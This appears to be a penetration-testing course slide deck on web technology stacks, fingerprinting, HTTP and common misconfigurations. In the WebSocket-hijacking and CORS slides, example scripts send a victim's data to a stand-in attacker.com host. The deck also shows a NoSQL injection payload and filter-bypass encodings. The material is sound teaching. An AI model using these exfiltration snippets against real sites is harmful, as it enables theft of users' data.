# Server Platforms & Web Technologies

## Understanding the Technology Stack

---

## Server Operating Systems

| OS | Market Share | Common Use |
|----|-------------|------------|
| **Linux** (Ubuntu, CentOS, RHEL) | ~75% of web servers | Most web applications |
| **Windows Server** | ~20% | `.NET`, `IIS`, enterprise |
| **FreeBSD** | ~3% | Netflix, WhatsApp |
| **Other Unix** | ~2% | Legacy systems |

- OS choice affects attack vectors and post-exploitation
- Identifying the OS is a key recon step

---

## Identifying the Server OS

```bash
# HTTP headers often leak OS info
curl -I https://target.com

# Example response headers
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
```

- `Server` header reveals web server and sometimes OS
- `X-Powered-By` reveals application framework
- Case sensitivity in URLs can hint at OS (Linux = case-sensitive)

---

## Web Server Software

<svg xmlns="http://www.w3.org/2000/svg" width="640" height="185" font-family="sans-serif">
  <!-- header row -->
  <rect x="10" y="10" width="200" height="35" rx="0" fill="#333" stroke="#333" stroke-width="1"/>
  <text x="110" y="32" text-anchor="middle" font-size="14" fill="#fff" font-weight="bold">Apache</text>
  <rect x="210" y="10" width="210" height="35" rx="0" fill="#333" stroke="#333" stroke-width="1"/>
  <text x="315" y="32" text-anchor="middle" font-size="14" fill="#fff" font-weight="bold">Nginx</text>
  <rect x="420" y="10" width="210" height="35" rx="0" fill="#333" stroke="#333" stroke-width="1"/>
  <text x="525" y="32" text-anchor="middle" font-size="14" fill="#fff" font-weight="bold">IIS</text>
  <!-- row 1 -->
  <rect x="10"  y="45" width="200" height="30" fill="#e3f2fd" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="64" font-size="12" fill="#222">Most popular</text>
  <rect x="210" y="45" width="210" height="30" fill="#e3f2fd" stroke="#ccc" stroke-width="1"/>
  <text x="220" y="64" font-size="12" fill="#222">Fastest growing</text>
  <rect x="420" y="45" width="210" height="30" fill="#e3f2fd" stroke="#ccc" stroke-width="1"/>
  <text x="430" y="64" font-size="12" fill="#222">Windows only</text>
  <!-- row 2 -->
  <rect x="10"  y="75" width="200" height="30" fill="#fff" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="94" font-size="12" fill="#222">.htaccess</text>
  <rect x="210" y="75" width="210" height="30" fill="#fff" stroke="#ccc" stroke-width="1"/>
  <text x="220" y="94" font-size="12" fill="#222">Reverse proxy</text>
  <rect x="420" y="75" width="210" height="30" fill="#fff" stroke="#ccc" stroke-width="1"/>
  <text x="430" y="94" font-size="12" fill="#222">.NET integrated</text>
  <!-- row 3 -->
  <rect x="10"  y="105" width="200" height="30" fill="#e3f2fd" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="124" font-size="12" fill="#222">mod_* modules</text>
  <rect x="210" y="105" width="210" height="30" fill="#e3f2fd" stroke="#ccc" stroke-width="1"/>
  <text x="220" y="124" font-size="12" fill="#222">Load balancing</text>
  <rect x="420" y="105" width="210" height="30" fill="#e3f2fd" stroke="#ccc" stroke-width="1"/>
  <text x="430" y="124" font-size="12" fill="#222">web.config</text>
  <!-- row 4 -->
  <rect x="10"  y="135" width="200" height="30" fill="#fff" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="154" font-size="12" fill="#222">httpd.conf</text>
  <rect x="210" y="135" width="210" height="30" fill="#fff" stroke="#ccc" stroke-width="1"/>
  <text x="220" y="154" font-size="12" fill="#222">nginx.conf</text>
  <rect x="420" y="135" width="210" height="30" fill="#fff" stroke="#ccc" stroke-width="1"/>
  <text x="430" y="154" font-size="12" fill="#222">ISAPI filters</text>
  <!-- outer border -->
  <rect x="10" y="10" width="620" height="155" rx="0" fill="none" stroke="#333" stroke-width="1.5"/>
</svg>

---

## Apache Configuration Pitfalls

```apache
# VULNERABLE: Directory listing enabled
<Directory /var/www/html>
    Options Indexes FollowSymLinks
    AllowOverride None
</Directory>

# SECURE: Directory listing disabled
<Directory /var/www/html>
    Options -Indexes +FollowSymLinks
    AllowOverride None
</Directory>
```

- Directory listing exposes file structure
- `.htaccess` misconfigurations are common
- `mod_status` and `mod_info` should be disabled in production

---

## Nginx Security Headers

```nginx
# Security headers configuration
server {
    # Prevent clickjacking
    add_header X-Frame-Options "SAMEORIGIN" always;

    # Prevent MIME sniffing
    add_header X-Content-Type-Options "nosniff" always;

    # Enable XSS protection
    add_header X-XSS-Protection "1; mode=block" always;

    # Content Security Policy
    add_header Content-Security-Policy
        "default-src 'self'; script-src 'self'" always;

    # HSTS
    add_header Strict-Transport-Security
        "max-age=31536000; includeSubDomains" always;
}
```

---

## IIS Identification & Fingerprinting

```output
IIS Version    ->  Windows Version
-----------        ---------------
IIS 6.0        ->  Windows Server 2003
IIS 7.0        ->  Windows Server 2008
IIS 7.5        ->  Windows Server 2008 R2
IIS 8.0        ->  Windows Server 2012
IIS 8.5        ->  Windows Server 2012 R2
IIS 10.0       ->  Windows Server 2016/2019/2022
```

- IIS version directly maps to Windows version
- `ASP.NET` version headers provide additional info
- `web.config` files can leak sensitive configuration

---

## Web Application Frameworks

| Language | Frameworks | Security Features |
|----------|-----------|-------------------|
| **Python** | Django, Flask, FastAPI | CSRF tokens, ORM |
| **JavaScript** | Express, Next.js, Nest | Helmet.js, CORS |
| **Java** | Spring, Struts, JSF | Spring Security |
| **PHP** | Laravel, Symfony | Eloquent ORM, CSRF |
| **Ruby** | Rails | Strong params, CSRF |
| **C#** | ASP.NET Core, MVC | AntiForgery, Identity |

---

## Framework Fingerprinting

```bash
# Common framework indicators
# PHP: .php extensions, PHPSESSID cookie
# Java: JSESSIONID cookie, .jsp/.do extensions
# ASP.NET: .aspx extensions, ASP.NET_SessionId cookie
# Python/Django: csrfmiddlewaretoken in forms
# Ruby/Rails: _session_id cookie, rails-specific paths

# Check cookies
curl -v https://target.com 2>&1 | grep -i "set-cookie"

# Check common paths
curl -s https://target.com/robots.txt
curl -s https://target.com/sitemap.xml
```

---

## Framework-Specific Attack Surfaces

<svg xmlns="http://www.w3.org/2000/svg" width="620" height="380" font-family="sans-serif">
  <!-- Django -->
  <rect x="10" y="10" width="280" height="130" rx="4" fill="#e3f2fd" stroke="#333" stroke-width="1.5"/>
  <text x="150" y="32" text-anchor="middle" font-size="14" fill="#222" font-weight="bold">Django</text>
  <text x="20" y="52"  font-size="12" fill="#222">/admin/  →  Admin panel</text>
  <text x="20" y="70"  font-size="12" fill="#222">/static/ →  Static files</text>
  <text x="20" y="88"  font-size="12" fill="#222">DEBUG=True  →  Detailed error pages</text>
  <!-- Rails -->
  <rect x="330" y="10" width="280" height="110" rx="4" fill="#e8f5e9" stroke="#333" stroke-width="1.5"/>
  <text x="470" y="32" text-anchor="middle" font-size="14" fill="#222" font-weight="bold">Rails</text>
  <text x="340" y="52"  font-size="12" fill="#222">/rails/info  →  Route info (dev mode)</text>
  <text x="340" y="70"  font-size="12" fill="#222">/assets/     →  Asset pipeline</text>
  <!-- Spring -->
  <rect x="10" y="160" width="280" height="110" rx="4" fill="#fff3e0" stroke="#333" stroke-width="1.5"/>
  <text x="150" y="182" text-anchor="middle" font-size="14" fill="#222" font-weight="bold">Spring</text>
  <text x="20" y="202" font-size="12" fill="#222">/actuator/  →  Health, metrics, env</text>
  <text x="20" y="220" font-size="12" fill="#222">/swagger-ui/ →  API documentation</text>
  <!-- Express -->
  <rect x="330" y="160" width="280" height="110" rx="4" fill="#f0f4f8" stroke="#333" stroke-width="1.5"/>
  <text x="470" y="182" text-anchor="middle" font-size="14" fill="#222" font-weight="bold">Express</text>
  <text x="340" y="202" font-size="12" fill="#222">/api-docs/  →  Swagger docs</text>
  <text x="340" y="220" font-size="12" fill="#222">X-Powered-By: Express  →  Header leak</text>
</svg>

---

## Data Stores - Relational Databases

| Database | Default Port | Common With |
|----------|-------------|-------------|
| `MySQL` / `MariaDB` | 3306 | PHP, Python, Java |
| `PostgreSQL` | 5432 | Python, Ruby, Java |
| `Microsoft SQL Server` | 1433 | `.NET`, Java |
| `Oracle` | 1521 | Java, enterprise |
| `SQLite` | File-based | Mobile, small apps |

- Each database has unique `SQL` dialect and features
- Error messages differ and aid in fingerprinting
- Default configurations often insecure

---

## NoSQL Data Stores

| Database | Type | Default Port |
|----------|------|-------------|
| `MongoDB` | Document | 27017 |
| `Redis` | Key-Value | 6379 |
| `Cassandra` | Wide-Column | 9042 |
| `CouchDB` | Document | 5984 |
| `Elasticsearch` | Search Engine | 9200 |

```javascript
// NoSQL Injection example (MongoDB)
// VULNERABLE: User input directly in query
db.users.find({ username: req.body.username,
                 password: req.body.password });

// Attack payload: { "$gt": "" } always evaluates true
```

---

## Database Fingerprinting via Errors

```misc
MySQL:
  "You have an error in your SQL syntax..."

PostgreSQL:
  "ERROR: syntax error at or near..."

MSSQL:
  "Unclosed quotation mark after the character string..."

Oracle:
  "ORA-01756: quoted string not properly terminated"

MongoDB:
  "SyntaxError: Unexpected token..."
```

- Error messages are goldmines for attackers
- Production should **never** display raw database errors

---

## Client-Side Technologies

<svg xmlns="http://www.w3.org/2000/svg" width="420" height="380" font-family="sans-serif">
  <!-- Browser outer -->
  <rect x="10" y="10" width="390" height="360" rx="6" fill="#f0f4f8" stroke="#333" stroke-width="2"/>
  <text x="200" y="35" text-anchor="middle" font-size="14" fill="#222" font-weight="bold">Browser Environment</text>
  <text x="25" y="60" font-size="13" fill="#222">HTML5</text>
  <!-- CSS3 box -->
  <rect x="20" y="68" width="350" height="230" rx="5" fill="#e3f2fd" stroke="#555" stroke-width="1.5"/>
  <text x="40" y="88" font-size="13" fill="#222">CSS3</text>
  <!-- JavaScript box -->
  <rect x="30" y="96" width="320" height="185" rx="5" fill="#e8f5e9" stroke="#555" stroke-width="1.5"/>
  <text x="50" y="116" font-size="13" fill="#222">JavaScript</text>
  <!-- Frameworks box -->
  <rect x="40" y="124" width="290" height="140" rx="4" fill="#fff" stroke="#aaa" stroke-width="1.5"/>
  <text x="185" y="145" text-anchor="middle" font-size="13" fill="#555" font-style="italic">Frameworks &amp; Libraries</text>
  <text x="60" y="165" font-size="12" fill="#222">React / Angular</text>
  <text x="60" y="183" font-size="12" fill="#222">Vue / Svelte</text>
  <text x="60" y="201" font-size="12" fill="#222">jQuery</text>
  <!-- Bottom items -->
  <text x="25" y="320" font-size="12" fill="#222">WebAssembly</text>
  <text x="25" y="338" font-size="12" fill="#222">Service Workers</text>
  <text x="200" y="320" font-size="12" fill="#222">Web Storage / IndexedDB</text>
  <text x="200" y="338" font-size="12" fill="#222">WebSockets</text>
</svg>

---

## JavaScript Frameworks - Security Implications

```javascript
// React - JSX auto-escapes by default (SAFE)
const name = "<script>alert('xss')</script>";
return <div>{name}</div>;  // Escaped, safe

// BUT - dangerouslySetInnerHTML bypasses protection
return <div dangerouslySetInnerHTML={{__html: userInput}} />;
// VULNERABLE if userInput is not sanitized

// Angular - also auto-escapes templates
// BUT [innerHTML]="userInput" can be dangerous

// Vue.js - v-html directive is dangerous
// <div v-html="userInput"></div>  // VULNERABLE
```

---

## Single Page Applications (SPA) Security

- Client-side routing exposes API endpoints
- `JWT` tokens stored in `localStorage` vulnerable to `XSS`
- API keys embedded in `JavaScript` bundles
- Source maps in production reveal original code
- `CORS` misconfigurations enable cross-origin attacks

```bash
# Finding API endpoints in JavaScript bundles
curl -s https://target.com/static/js/main.js | \
  grep -oE '"/(api|v[0-9])/[^"]*"'

# Check for source maps
curl -s https://target.com/static/js/main.js.map
```

---

## WebSockets - Expanding Attack Surface

```javascript
// WebSocket connection
const ws = new WebSocket('wss://target.com/chat');

// Security concerns:
// 1. No same-origin policy enforcement
// 2. CSRF-like attacks (Cross-Site WebSocket Hijacking)
// 3. Message injection
// 4. Lack of authentication per-message

// Attack: Cross-Site WebSocket Hijacking
// From attacker's page:
const malicious = new WebSocket('wss://target.com/chat');
malicious.onmessage = (e) => {
    // Steal data from victim's session
    fetch('https://attacker.com/steal?data=' + e.data);
};
```

---

## Browser Storage Security

```javascript
// localStorage - Persistent, ~5MB, vulnerable to XSS
localStorage.setItem('token', 'eyJhbGciOiJI...');
// ANY JavaScript on the page can read this!

// sessionStorage - Tab-scoped, cleared on close
sessionStorage.setItem('temp', 'data');

// Cookies - Can be HttpOnly (no JS access)
// Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

// IndexedDB - Large storage, also vulnerable to XSS
// Best practice: Never store sensitive tokens in
// localStorage or sessionStorage
```

---

## HTTP Protocol Fundamentals

```http
GET /login HTTP/1.1              <-- Request Line
Host: target.com                 <-- Headers
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: session=abc123
                                 <-- Empty line
                                 <-- Body (empty for GET)

HTTP/1.1 200 OK                  <-- Status Line
Content-Type: text/html          <-- Response Headers
Set-Cookie: session=xyz789
Content-Length: 1234
                                 <-- Empty line
<html>...</html>                 <-- Response Body
```

---

## HTTP Methods & Security

| Method | Purpose | Security Notes |
|--------|---------|---------------|
| `GET` | Retrieve data | Params in URL, logged, cached |
| `POST` | Submit data | Body not in URL, not cached |
| `PUT` | Update/create | Can overwrite resources |
| `DELETE` | Remove resource | Must be authorized |
| `PATCH` | Partial update | Must validate fields |
| `OPTIONS` | Check methods | CORS preflight |
| `HEAD` | Get headers only | Info disclosure |
| `TRACE` | Debug/echo | XST attacks, disable it |

---

## HTTP Status Codes for Pentesters

<svg xmlns="http://www.w3.org/2000/svg" width="640" height="325" font-family="sans-serif">
  <!-- header -->
  <rect x="10" y="10" width="620" height="30" rx="0" fill="#333"/>
  <text x="320" y="30" text-anchor="middle" font-size="13" fill="#fff" font-weight="bold">HTTP Status Codes — Security Implications</text>
  <!-- rows -->
  <rect x="10" y="40"  width="620" height="26" fill="#e3f2fd" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="57"  font-size="12" fill="#222" font-weight="bold">200 OK</text>
  <text x="180" y="57"  font-size="12" fill="#222">→  Resource found, access granted</text>
  <rect x="10" y="66"  width="620" height="26" fill="#fff" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="83"  font-size="12" fill="#222" font-weight="bold">301/302 Redirect</text>
  <text x="180" y="83"  font-size="12" fill="#222">→  Follow to see where it goes</text>
  <rect x="10" y="92"  width="620" height="26" fill="#e3f2fd" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="109" font-size="12" fill="#222" font-weight="bold">400 Bad Request</text>
  <text x="180" y="109" font-size="12" fill="#222">→  Malformed input, try variations</text>
  <rect x="10" y="118" width="620" height="26" fill="#fff" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="135" font-size="12" fill="#222" font-weight="bold">401 Unauthorized</text>
  <text x="180" y="135" font-size="12" fill="#222">→  Auth required, try bypasses</text>
  <rect x="10" y="144" width="620" height="26" fill="#e3f2fd" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="161" font-size="12" fill="#222" font-weight="bold">403 Forbidden</text>
  <text x="180" y="161" font-size="12" fill="#222">→  Access denied, try bypasses</text>
  <rect x="10" y="170" width="620" height="26" fill="#fff" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="187" font-size="12" fill="#222" font-weight="bold">404 Not Found</text>
  <text x="180" y="187" font-size="12" fill="#222">→  Resource doesn't exist (or does it?)</text>
  <rect x="10" y="196" width="620" height="26" fill="#e3f2fd" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="213" font-size="12" fill="#222" font-weight="bold">405 Method Not Allowed</text>
  <text x="180" y="213" font-size="12" fill="#222">→  Try other HTTP methods</text>
  <rect x="10" y="222" width="620" height="26" fill="#fff" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="239" font-size="12" fill="#222" font-weight="bold">500 Internal Error</text>
  <text x="180" y="239" font-size="12" fill="#222">→  Server crash, possible injection</text>
  <rect x="10" y="248" width="620" height="26" fill="#e3f2fd" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="265" font-size="12" fill="#222" font-weight="bold">502 Bad Gateway</text>
  <text x="180" y="265" font-size="12" fill="#222">→  Backend server issue</text>
  <rect x="10" y="274" width="620" height="26" fill="#fff" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="291" font-size="12" fill="#222" font-weight="bold">503 Service Unavailable</text>
  <text x="180" y="291" font-size="12" fill="#222">→  Rate limiting or DoS indicator</text>
  <rect x="10" y="10" width="620" height="290" fill="none" stroke="#333" stroke-width="1.5"/>
</svg>

> A `403` vs `404` difference reveals resource existence

---

## HTTPS/TLS Security

```bash
# Check TLS configuration
nmap --script ssl-enum-ciphers -p 443 target.com

# Test for common TLS issues
testssl.sh target.com

# Common findings:
# - SSLv3/TLS 1.0/1.1 still enabled
# - Weak cipher suites (RC4, DES, NULL)
# - Missing HSTS header
# - Certificate issues (expired, wrong domain)
# - BEAST, POODLE, Heartbleed vulnerabilities
```

---

## Content Types That Matter

<svg xmlns="http://www.w3.org/2000/svg" width="640" height="340" font-family="sans-serif">
  <!-- header -->
  <rect x="10" y="10" width="620" height="30" rx="0" fill="#333"/>
  <text x="320" y="30" text-anchor="middle" font-size="13" fill="#fff" font-weight="bold">Content Types — Security Implications</text>
  <!-- rows -->
  <rect x="10" y="40"  width="620" height="26" fill="#e3f2fd" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="57"  font-size="12" fill="#222" font-weight="bold">text/html</text>
  <text x="220" y="57"  font-size="12" fill="#222">→  Rendered as HTML (XSS risk)</text>
  <rect x="10" y="66"  width="620" height="26" fill="#fff" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="83"  font-size="12" fill="#222" font-weight="bold">application/json</text>
  <text x="220" y="83"  font-size="12" fill="#222">→  Parsed as JSON (safer)</text>
  <rect x="10" y="92"  width="620" height="26" fill="#e3f2fd" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="109" font-size="12" fill="#222" font-weight="bold">text/plain</text>
  <text x="220" y="109" font-size="12" fill="#222">→  Displayed as text (safer)</text>
  <rect x="10" y="118" width="620" height="26" fill="#fff" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="135" font-size="12" fill="#222" font-weight="bold">application/xml</text>
  <text x="220" y="135" font-size="12" fill="#222">→  Parsed as XML (XXE risk)</text>
  <rect x="10" y="144" width="620" height="26" fill="#e3f2fd" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="161" font-size="12" fill="#222" font-weight="bold">multipart/form-data</text>
  <text x="220" y="161" font-size="12" fill="#222">→  File uploads (shell risk)</text>
  <rect x="10" y="170" width="620" height="26" fill="#fff" stroke="#ccc" stroke-width="1"/>
  <text x="20"  y="187" font-size="12" fill="#222" font-weight="bold">application/x-www-form-urlencoded</text>
  <text x="320" y="187" font-size="12" fill="#222">→  Form data</text>
  <!-- note box -->
  <rect x="10" y="210" width="620" height="90" rx="4" fill="#fff3e0" stroke="#333" stroke-width="1.5"/>
  <text x="25" y="232" font-size="13" fill="#555" font-weight="bold">Mismatched Content-Type can lead to:</text>
  <text x="25" y="252" font-size="12" fill="#222">• Browser MIME sniffing (XSS)</text>
  <text x="25" y="270" font-size="12" fill="#222">• Parser confusion attacks</text>
  <text x="25" y="288" font-size="12" fill="#222">• Content injection</text>
  <rect x="10" y="10" width="620" height="290" fill="none" stroke="#333" stroke-width="1.5"/>
</svg>

---

## Encoding Schemes in Web Security

| Encoding | Example | Use |
|----------|---------|-----|
| URL encoding | `%3Cscript%3E` | URL parameters |
| HTML entities | `&lt;script&gt;` | HTML content |
| Base64 | `PHNjcmlwdD4=` | Binary data, tokens |
| Unicode | `\u003cscript\u003e` | JavaScript strings |
| Hex | `\x3cscript\x3e` | Bypass filters |
| Double encoding | `%253Cscript%253E` | Bypass WAFs |

---

## Proxy Architecture

<svg xmlns="http://www.w3.org/2000/svg" width="680" height="175" font-family="sans-serif">
  <defs>
    <marker id="ah12f" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#555"/>
    </marker>
    <marker id="ah12b" markerWidth="8" markerHeight="8" refX="2" refY="3" orient="auto">
      <path d="M8,0 L8,6 L0,3 z" fill="#555"/>
    </marker>
  </defs>
  <!-- boxes -->
  <rect x="10"  y="30" width="110" height="70" rx="4" fill="#e3f2fd" stroke="#333" stroke-width="1.5"/>
  <text x="65"  y="65" text-anchor="middle" font-size="13" fill="#222">Browser</text>
  <rect x="185" y="30" width="120" height="70" rx="4" fill="#fff3e0" stroke="#333" stroke-width="1.5"/>
  <text x="245" y="62" text-anchor="middle" font-size="13" fill="#222">Burp Suite</text>
  <rect x="375" y="30" width="120" height="70" rx="4" fill="#e8f5e9" stroke="#333" stroke-width="1.5"/>
  <text x="435" y="62" text-anchor="middle" font-size="13" fill="#222">WAF / CDN</text>
  <rect x="565" y="30" width="110" height="70" rx="4" fill="#f0f4f8" stroke="#333" stroke-width="1.5"/>
  <text x="620" y="62" text-anchor="middle" font-size="13" fill="#222">Web Server</text>
  <!-- forward arrows -->
  <line x1="120" y1="58" x2="183" y2="58" stroke="#555" stroke-width="1.5" marker-end="url(#ah12f)"/>
  <line x1="305" y1="58" x2="373" y2="58" stroke="#555" stroke-width="1.5" marker-end="url(#ah12f)"/>
  <line x1="495" y1="58" x2="563" y2="58" stroke="#555" stroke-width="1.5" marker-end="url(#ah12f)"/>
  <!-- back arrows -->
  <line x1="183" y1="72" x2="120" y2="72" stroke="#555" stroke-width="1.5" marker-end="url(#ah12f)"/>
  <line x1="373" y1="72" x2="305" y2="72" stroke="#555" stroke-width="1.5" marker-end="url(#ah12f)"/>
  <line x1="563" y1="72" x2="495" y2="72" stroke="#555" stroke-width="1.5" marker-end="url(#ah12f)"/>
  <!-- labels -->
  <text x="245" y="120" text-anchor="middle" font-size="11" fill="#555">Intercept</text>
  <text x="245" y="133" text-anchor="middle" font-size="11" fill="#555">&amp; modify</text>
  <text x="245" y="146" text-anchor="middle" font-size="11" fill="#555">requests</text>
  <text x="435" y="120" text-anchor="middle" font-size="11" fill="#555">May modify</text>
  <text x="435" y="133" text-anchor="middle" font-size="11" fill="#555">requests</text>
  <text x="620" y="120" text-anchor="middle" font-size="11" fill="#555">Origin</text>
  <text x="620" y="133" text-anchor="middle" font-size="11" fill="#555">server</text>
</svg>

- Proxies allow inspection and modification of traffic
- Multiple proxy layers can complicate testing
- `CDN`s and `WAF`s add additional processing

---

## Technology Stack Identification - Summary

```bash
# Automated fingerprinting
whatweb https://target.com
wappalyzer  # Browser extension
builtwith   # Online service

# Manual checks
# 1. HTTP headers (Server, X-Powered-By)
# 1. Cookie names (PHPSESSID, JSESSIONID, etc.)
# 1. File extensions (.php, .aspx, .jsp)
# 1. HTML comments and meta tags
# 1. JavaScript framework artifacts
# 1. Error page formats
# 1. Default files (robots.txt, sitemap.xml)
# 1. Response timing characteristics
```

---

## CORS (Cross-Origin Resource Sharing)

```http
# CORS controls which origins can access resources
# Misconfiguration = data theft

# Browser sends:
Origin: https://attacker.com

# Vulnerable server responds:
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
# Reflects ANY origin with credentials = critical vuln!

# Attack: Read sensitive data cross-origin
<script>
fetch('https://target.com/api/user/profile', {
    credentials: 'include'
}).then(r => r.json())
  .then(data => {
    // Send victim's data to attacker
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
</script>

# Secure CORS configuration:
Access-Control-Allow-Origin: https://trusted-app.com
# Whitelist specific, trusted origins only
# Never reflect the Origin header blindly
```

---

## HTTP/2 and HTTP/3 Security Considerations

```misc
HTTP/2 Features:
  - Binary protocol (harder to inspect manually)
  - Multiplexed connections
  - Header compression (HPACK)
  - Server push
  - Potential for request smuggling

HTTP/2 Attack Vectors:
  - H2.CL and H2.TE request smuggling
  - HPACK bomb (decompression bomb)
  - Stream priority manipulation (DoS)
  - Pseudo-header injection

Testing HTTP/2:
  - Burp Suite handles HTTP/2 transparently
  - Use --http2 flag with curl
  - h2spec tool for compliance testing

HTTP/3 (QUIC):
  - UDP-based transport
  - Built-in TLS 1.3
  - Different network monitoring approach needed
```

---

## Lab Exercise: Technology Fingerprinting

**Objective**: Identify the complete technology stack of a target

1. Set up Burp Suite as your browser proxy
1. Browse to the target application
1. Examine `HTTP` response headers
1. Check cookie names and values
1. View page source for framework indicators
1. Run `whatweb` against the target
1. Document all technologies identified

```bash
whatweb -v https://target-lab.local
nikto -h https://target-lab.local
```

---

## Summary

- Web applications have complex, multi-layered stacks
- Each technology layer introduces unique vulnerabilities
- OS, web server, framework, and database all matter
- Client-side technologies are increasingly complex
- `HTTP` is the foundation - understand it deeply
- Technology fingerprinting is the first step in any assessment
- Always check for misconfigurations at every layer

> Next: Offensive Toolset & Practice Targets
